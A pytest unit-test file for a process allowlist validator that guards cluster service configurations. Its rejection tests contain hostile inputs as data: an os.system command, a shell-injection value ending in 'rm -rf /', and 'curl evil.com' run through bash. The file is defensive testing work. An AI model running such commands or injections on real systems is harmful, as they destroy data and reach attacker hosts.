"""集群 process 白名单单测。"""
import sys
from pathlib import Path

import pytest

BACKEND_DIR = Path(__file__).resolve().parents[2]
if str(BACKEND_DIR) not in sys.path:
    sys.path.insert(0, str(BACKEND_DIR))

from services.process_allowlist import (  # noqa: E402
    ProcessConfigError,
    validate_cluster_config,
    validate_process_spec,
)


def test_allowed_module():
    validate_process_spec({"module": "plaita.server.flow_worker"}, service_key="fw")


def test_allowed_services_command():
    validate_process_spec(
        {"command": "python -m plaita.server.services delay_service"},
        service_key="delay",
    )


def test_reject_arbitrary_command():
    with pytest.raises(ProcessConfigError):
        validate_process_spec(
            {"command": "python -c 'import os; os.system(\"id\")'"},
            service_key="evil",
        )


def test_reject_unknown_module():
    with pytest.raises(ProcessConfigError):
        validate_process_spec({"module": "os"}, service_key="evil")


def test_reject_shell_injection_in_command():
    with pytest.raises(ProcessConfigError):
        validate_process_spec(
            {"command": "python -m plaita.server.services delay_service; rm -rf /"},
            service_key="evil",
        )


def test_reject_unknown_subcommand():
    with pytest.raises(ProcessConfigError):
        validate_process_spec(
            {"command": "python -m plaita.server.services evil_service"},
            service_key="evil",
        )


def test_cluster_config_validates_all_services():
    cfg = {
        "services": {
            "flow_worker": {
                "process": {"module": "plaita.server.flow_worker"},
            },
            "delay": {
                "process": {
                    "command": "python -m plaita.server.services delay_service"
                },
            },
        }
    }
    validate_cluster_config(cfg)


def test_cluster_config_rejects_evil_service():
    cfg = {
        "services": {
            "evil": {"process": {"command": "bash -c 'curl evil.com'"}},
        }
    }
    with pytest.raises(ProcessConfigError):
        validate_cluster_config(cfg)
